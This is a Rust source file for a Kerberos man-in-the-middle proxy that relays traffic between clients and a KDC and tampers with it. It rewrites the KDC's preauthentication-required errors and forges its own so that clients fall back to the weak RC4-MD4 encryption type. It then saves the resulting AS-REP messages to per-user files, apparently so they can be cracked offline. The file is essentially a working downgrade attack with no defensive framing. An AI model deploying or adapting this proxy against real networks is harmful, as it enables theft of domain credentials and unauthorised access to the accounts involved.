use std::{
    fs::File,
    io::{self, Write},
    net::SocketAddr,
    path::PathBuf,
    sync::Arc,
};

use bytes::{Buf, BufMut, Bytes, BytesMut};
use chrono::Utc;
use futures::{
    future::abortable,
    stream::{SplitSink, SplitStream},
    SinkExt, StreamExt,
};
use nom::{
    branch::alt,
    combinator::{into, map_res},
    multi::length_data,
    number::streaming::be_u32,
    IResult, Offset,
};

use rasn::{der, types::SequenceOf};
use rasn_kerberos::{
    AsRep, AsReq, EncryptedData, EtypeInfo2, EtypeInfo2Entry, KdcReq, KerberosTime, KrbError,
    PaData, PaEncTimestamp, TgsRep, TgsReq,
};
use tokio::{
    net::{TcpListener, TcpStream},
    sync::Mutex,
};
use tokio_util::codec::{Decoder, Encoder, Framed};
use tracing::{error, info, warn};

use crate::{
    ERR_PREAUTH_REQUIRED, ETYPE_AES128_CTS_HMAC_SHA1_96, ETYPE_RC4_HMAC_MD5, ETYPE_RC4_MD4,
    PA_ENC_TIMESTAMP, PA_ETYPE_INFO2,
};

pub struct Proxy {
    downstream: Framed<TcpStream, KdcCodec>,
    upstream: Framed<TcpStream, KdcCodec>,
}

impl Proxy {
    pub async fn listen(listen_addr: SocketAddr, remote_addr: SocketAddr) -> io::Result<()> {
        let listener = TcpListener::bind(listen_addr).await?;
        info!("Listening on {}", &listen_addr);
        loop {
            let (client_stream, client_addr) = listener.accept().await?;
            info!("Received connection from {}", &client_addr);
            let downstream = Framed::new(client_stream, KdcCodec);
            let remote_stream = TcpStream::connect(remote_addr).await?;
            let upstream = Framed::new(remote_stream, KdcCodec);
            let proxy = Self {
                downstream,
                upstream,
            };
            tokio::spawn(proxy.run());
        }
    }

    async fn run(self) -> io::Result<()> {
        let (client_sink, mut client_stream): (
            SplitSink<Framed<TcpStream, KdcCodec>, KdcFrame>,
            SplitStream<Framed<TcpStream, KdcCodec>>,
        ) = self.downstream.split();
        let client_sink = Arc::new(Mutex::new(client_sink));
        let client_reply_sink = client_sink.clone();

        let (mut kdc_sink, mut kdc_stream): (
            SplitSink<Framed<TcpStream, KdcCodec>, KdcFrame>,
            SplitStream<Framed<TcpStream, KdcCodec>>,
        ) = self.upstream.split();

        let (client_handler, client_abort_handle) = abortable(async move {
            while let Some(item) = client_stream.next().await {
                match item {
                    Ok(KdcFrame::AsReq(mut as_req)) => {
                        match &as_req.get_preauth_etype() {
                            None => {
                                info!("Received AsReq from client w/o preauth");
                            }
                            Some(ETYPE_RC4_MD4) => {
                                info!(
                                    "Received AsReq for {}\\{} with RC4_MD4 preauth!",
                                    as_req.get_realm(),
                                    as_req.get_cname()
                                );
                                as_req.0.req_body.etype =
                                    vec![ETYPE_AES128_CTS_HMAC_SHA1_96, ETYPE_RC4_HMAC_MD5];
                                info!("Downgraded req_body.etype to AES128");
                            }
                            Some(etype) => {
                                info!("Received AsReq from client with preauth etype: {etype}");
                                info!("Replying with KDC_ERR_PREAUTH_REQUIRED...");
                                let reply = as_req.reply_etype_nosupp();
                                client_reply_sink
                                    .lock()
                                    .await
                                    .send(reply.into())
                                    .await
                                    .unwrap();
                                continue; // Do not foward AsReq to KDC
                            }
                        }
                        kdc_sink.send(as_req.into()).await.unwrap();
                        info!("Forwarded AsReq to KDC");
                    }
                    // Ok(KdcFrame::AsReq(as_req)) => {
                    //     //as_req.0.padata = None;
                    //     //as_req.0.req_body.etype = vec![-128];
                    //     //info!("Forwarding AsReq to server with modified etype");
                    //     up_write.send(as_req.into()).await.unwrap();
                    // }
                    Ok(KdcFrame::RawTgsReq(raw_tgs_req)) => {
                        info!("Received TgsReq from client");
                        kdc_sink.send(raw_tgs_req.into()).await.unwrap();
                    }
                    Ok(KdcFrame::TgsReq(tgs_req)) => {
                        info!("Received TgsReq from client");
                        kdc_sink.send(tgs_req.into()).await.unwrap();
                    }
                    Ok(KdcFrame::KrbError(krb_error)) => {
                        warn!(
                            "Received unexpected KrbError({}) from client",
                            &krb_error.error_code
                        );
                        kdc_sink.send(krb_error.into()).await.unwrap();
                    }
                    Ok(kdc_frame) => {
                        warn!("Received unexpected KdcRep from client");
                        kdc_sink.send(kdc_frame).await.unwrap();
                    }
                    Err(_) => error!("Received unknown data from client"),
                }
            }
        });

        let (kdc_handler, kdc_abort_handle) = abortable(async move {
            while let Some(item) = kdc_stream.next().await {
                match item {
                    Ok(KdcFrame::AsRep(as_rep)) => {
                        match as_rep.0.enc_part.etype {
                            ETYPE_RC4_MD4 => {
                                info!("Received RC4-MD4 encrypted AsRep from KDC!");
                                //dbg!(as_rep.0.enc_part.cipher.hex_dump());
                                write_asrep(&as_rep).unwrap();
                            }
                            _ => info!("Received other AsRep from KDC"),
                        }
                        //client_sink.send(as_rep.into()).await.unwrap();
                        client_sink.lock().await.send(as_rep.into()).await.unwrap();
                    }
                    Ok(KdcFrame::TgsRep(tgs_rep)) => {
                        info!("Received TgsRep from KDC");
                        //client_sink.send(tgs_rep.into()).await.unwrap();
                        client_sink.lock().await.send(tgs_rep.into()).await.unwrap();
                    }
                    Ok(KdcFrame::KrbError(mut krb_error)) => {
                        match krb_error.error_code {
                            ERR_PREAUTH_REQUIRED => {
                                info!("Received KDC_ERR_PREAUTH_REQUIRED from KDC");
                                if let Some(s) = &krb_error.e_data {
                                    let mut edata: SequenceOf<PaData> = der::decode(s).unwrap();
                                    //dbg!(&edata);
                                    downgrade_edata(&mut edata);
                                    krb_error.e_data = Some(der::encode(&edata).unwrap().into());
                                    info!(
                                        "Forwarding KDC_ERR_PREAUTH_REQUIRED with modified etype"
                                    );
                                }
                            }
                            _ => info!("Received KrbError({}) from KDC", &krb_error.error_code),
                        }
                        //client_sink.send(krb_error.into()).await.unwrap();
                        client_sink
                            .lock()
                            .await
                            .send(krb_error.into())
                            .await
                            .unwrap();
                    }
                    Ok(kdc_frame) => {
                        warn!("Received unexpected KdcReq from KDC");
                        //client_sink.send(kdc_frame).await.unwrap();
                        client_sink.lock().await.send(kdc_frame).await.unwrap();
                    }
                    Err(_) => error!("Received unknown data from KDC"),
                }
            }
        });

        tokio::select! {
            _ = tokio::spawn(client_handler) => {
                info!("Client disconnected");
                // TODO: close upstream connection to server instead of letting it time out
                kdc_abort_handle.abort();
            }
            _ = tokio::spawn(kdc_handler) => {
                info!("Server disconnected");
                // TODO: close downstream connection to client
                client_abort_handle.abort();
            }
        }
        Ok(())
    }
}

fn write_asrep(as_rep: &AsRep) -> io::Result<()> {
    let path = PathBuf::from(format!(
        "asrep_{}.bin",
        as_rep.0.cname.string.iter().next().unwrap().as_str()
    ));
    let mut file = File::create(&path)?;
    let buf = der::encode(as_rep)
        .map_err(|_| io::Error::new(io::ErrorKind::InvalidData, "Failed to encode AsRep value"))?;
    file.write_all(&buf)?;
    info!("Wrote AsRep out to {}", &path.display());
    Ok(())
}

fn downgrade_edata(edata: &mut SequenceOf<PaData>) {
    let entry = EtypeInfo2Entry {
        etype: ETYPE_RC4_MD4,
        salt: None,
        s2kparams: None,
    };
    let info2: EtypeInfo2 = vec![entry].into();
    let value: Bytes = der::encode(&info2).unwrap().into();
    edata
        .iter_mut()
        .filter(|padata| padata.r#type == PA_ETYPE_INFO2)
        .for_each(|padata| padata.value = value.clone())
}
// fn downgrade_edata_aes128(edata: &mut SequenceOf<PaData>) {
//     todo!()
// }

trait AsReqExt {
    fn get_cname(&self) -> &str;
    fn get_realm(&self) -> &str;
    fn get_preauth_etype(&self) -> Option<i32>;
    fn get_pa_enc_timestamp(&self) -> Option<EncryptedData>;
    fn is_rc4_md4(&self) -> bool;
    fn reply_etype_nosupp(&self) -> KrbError;
}

impl AsReqExt for AsReq {
    fn get_cname(&self) -> &str {
        self.0
            .req_body
            .cname
            .as_ref()
            .unwrap()
            .string
            .iter()
            .next()
            .as_ref()
            .unwrap()
    }

    fn get_realm(&self) -> &str {
        self.0.req_body.realm.as_ref()
    }

    fn get_pa_enc_timestamp(&self) -> Option<EncryptedData> {
        match self {
            AsReq(KdcReq {
                pvno: _,
                msg_type: _,
                padata: Some(padata_entries),
                req_body: _,
            }) => {
                let entry = padata_entries
                    .iter()
                    .filter(|e| e.r#type == PA_ENC_TIMESTAMP)
                    .next()?;
                let cipher: PaEncTimestamp = der::decode(&entry.value).ok()?;
                Some(cipher)
            }
            _ => None,
        }
    }

    fn get_preauth_etype(&self) -> Option<i32> {
        if let Some(padata_entries) = &self.0.padata {
            if let Some(padata) = padata_entries
                .iter()
                .filter(|entry| entry.r#type == PA_ENC_TIMESTAMP)
                .next()
            {
                let entry: EtypeInfo2Entry = der::decode(&padata.value).unwrap();
                Some(entry.etype)
            } else {
                None
            }
        } else {
            None
        }
    }

    fn is_rc4_md4(&self) -> bool {
        let entry = EtypeInfo2Entry {
            etype: ETYPE_RC4_MD4,
            salt: None,
            s2kparams: None,
        };
        let info2: EtypeInfo2 = vec![entry].into();
        let value: Bytes = der::encode(&info2).unwrap().into();
        match &self.0.padata {
            Some(padata)
                if padata.first()
                    == Some(&PaData {
                        r#type: PA_ENC_TIMESTAMP,
                        value,
                    }) =>
            {
                true
            }
            _ => false,
        }
    }

    fn reply_etype_nosupp(&self) -> KrbError {
        let entry = EtypeInfo2Entry {
            etype: ETYPE_RC4_MD4,
            salt: None,
            s2kparams: None,
        };
        let info2: EtypeInfo2 = vec![entry].into();
        let value: Bytes = der::encode(&info2).unwrap().into();
        //let padata = PaData { r#type: PA_ETYPE_INFO2, value };
        let edata: SequenceOf<PaData> = vec![
            PaData {
                r#type: PA_ETYPE_INFO2,
                value,
            },
            PaData {
                r#type: PA_ENC_TIMESTAMP,
                value: Bytes::new(),
            },
            PaData {
                r#type: 16,
                value: Bytes::new(),
            }, // PA_PK_AS_REQ
            PaData {
                r#type: 15,
                value: Bytes::new(),
            }, // PA_PK_AS_REP_19
        ];
        let edata = der::encode(&edata).unwrap().into();

        KrbError {
            pvno: 5.into(),
            msg_type: 30.into(), // KRB_ERROR
            ctime: None,
            cusec: None,
            stime: KerberosTime(Utc::now().into()),
            susec: 0.into(),
            error_code: ERR_PREAUTH_REQUIRED.into(),
            crealm: None,
            cname: None,
            realm: self.0.req_body.realm.clone(),
            sname: self.0.req_body.sname.clone().unwrap(),
            e_text: None,
            e_data: Some(edata),
        }
    }
}

trait AsRepExt {
    fn get_cname(&self) -> &str;
}

impl AsRepExt for AsRep {
    fn get_cname(&self) -> &str {
        self.0.cname.string.iter().next().unwrap().as_str()
    }
}

// Codec/Framing
#[derive(derive_more::From)]
pub enum KdcFrame {
    AsReq(AsReq),
    AsRep(AsRep),
    RawTgsReq(Vec<u8>),
    TgsReq(TgsReq),
    TgsRep(TgsRep),
    KrbError(KrbError),
}

pub struct KdcCodec;

impl Decoder for KdcCodec {
    type Item = KdcFrame;

    type Error = io::Error;

    fn decode(&mut self, src: &mut BytesMut) -> Result<Option<Self::Item>, Self::Error> {
        match parse_kdc_frame(src) {
            Ok((leftover, req)) => {
                src.advance(src.offset(leftover));
                Ok(Some(req))
            }
            Err(nom::Err::Incomplete(_needed)) => Ok(None),
            Err(_) => Err(io::Error::new(
                io::ErrorKind::InvalidData,
                "Failed to decode AsReq",
            )),
        }
    }
}

impl Encoder<KdcFrame> for KdcCodec {
    type Error = io::Error;

    fn encode(&mut self, item: KdcFrame, dst: &mut BytesMut) -> Result<(), Self::Error> {
        match item {
            KdcFrame::AsReq(item) => self.encode(item, dst),
            KdcFrame::AsRep(item) => self.encode(item, dst),
            KdcFrame::TgsReq(item) => self.encode(item, dst),
            KdcFrame::TgsRep(item) => self.encode(item, dst),
            KdcFrame::KrbError(item) => self.encode(item, dst),
            KdcFrame::RawTgsReq(item) => {
                dst.reserve(4 + item.len());
                dst.put_u32(item.len().try_into().unwrap());
                dst.put(item.as_slice());
                Ok(())
            }
        }
    }
}

impl Encoder<AsReq> for KdcCodec {
    type Error = io::Error;

    fn encode(&mut self, item: AsReq, dst: &mut BytesMut) -> Result<(), Self::Error> {
        let src = der::encode(&item)
            .map_err(|_| io::Error::new(io::ErrorKind::InvalidInput, "Failed to encode AsReq"))?;
        dst.reserve(4 + src.len());
        dst.put_u32(src.len().try_into().unwrap());
        dst.put(src.as_slice());
        Ok(())
    }
}

impl Encoder<AsRep> for KdcCodec {
    type Error = io::Error;

    fn encode(&mut self, item: AsRep, dst: &mut BytesMut) -> Result<(), Self::Error> {
        let src = der::encode(&item)
            .map_err(|_| io::Error::new(io::ErrorKind::InvalidInput, "Failed to encode AsRep"))?;
        dst.reserve(4 + src.len());
        dst.put_u32(src.len().try_into().unwrap());
        dst.put(src.as_slice());
        Ok(())
    }
}

impl Encoder<TgsReq> for KdcCodec {
    type Error = io::Error;

    fn encode(&mut self, item: TgsReq, dst: &mut BytesMut) -> Result<(), Self::Error> {
        let src = der::encode(&item)
            .map_err(|_| io::Error::new(io::ErrorKind::InvalidInput, "Failed to encode TgsReq"))?;
        dst.reserve(4 + src.len());
        dst.put_u32(src.len().try_into().unwrap());
        dst.put(src.as_slice());
        Ok(())
    }
}

impl Encoder<TgsRep> for KdcCodec {
    type Error = io::Error;

    fn encode(&mut self, item: TgsRep, dst: &mut BytesMut) -> Result<(), Self::Error> {
        let src = der::encode(&item)
            .map_err(|_| io::Error::new(io::ErrorKind::InvalidInput, "Failed to encode TgsRep"))?;
        dst.reserve(4 + src.len());
        dst.put_u32(src.len().try_into().unwrap());
        dst.put(src.as_slice());
        Ok(())
    }
}

impl Encoder<KrbError> for KdcCodec {
    type Error = io::Error;

    fn encode(&mut self, item: KrbError, dst: &mut BytesMut) -> Result<(), Self::Error> {
        let src = der::encode(&item).map_err(|_| {
            io::Error::new(io::ErrorKind::InvalidInput, "Failed to encode KrbError")
        })?;
        dst.reserve(4 + src.len());
        dst.put_u32(src.len().try_into().unwrap());
        dst.put(src.as_slice());
        Ok(())
    }
}

fn parse_kdc_frame(input: &[u8]) -> IResult<&[u8], KdcFrame> {
    alt((
        into(parse_as_req),
        into(parse_as_rep),
        parse_raw_tgs_req,
        //into(parse_tgs_req),
        into(parse_tgs_rep),
        into(parse_krb_error),
    ))(input)
}
fn parse_as_req(input: &[u8]) -> IResult<&[u8], AsReq> {
    map_res(length_data(be_u32), |s| der::decode::<AsReq>(s))(input)
}

fn parse_as_rep(input: &[u8]) -> IResult<&[u8], AsRep> {
    map_res(length_data(be_u32), |s| der::decode::<AsRep>(s))(input)
}

fn parse_raw_tgs_req(input: &[u8]) -> IResult<&[u8], KdcFrame> {
    map_res(length_data(be_u32), |s: &[u8]| match s[0x11] {
        0x0c => Ok(KdcFrame::RawTgsReq(s.to_vec())),
        _ => Err(nom::error::Error::new(s, nom::error::ErrorKind::Tag)),
    })(input)
}
// fn parse_tgs_req(input: &[u8]) -> IResult<&[u8], TgsReq> {
//     map_res(length_data(be_u32), |s| der::decode::<TgsReq>(s))(input)
// }

fn parse_tgs_rep(input: &[u8]) -> IResult<&[u8], TgsRep> {
    map_res(length_data(be_u32), |s| der::decode::<TgsRep>(s))(input)
}

fn parse_krb_error(input: &[u8]) -> IResult<&[u8], KrbError> {
    map_res(length_data(be_u32), |s| der::decode::<KrbError>(s))(input)
}
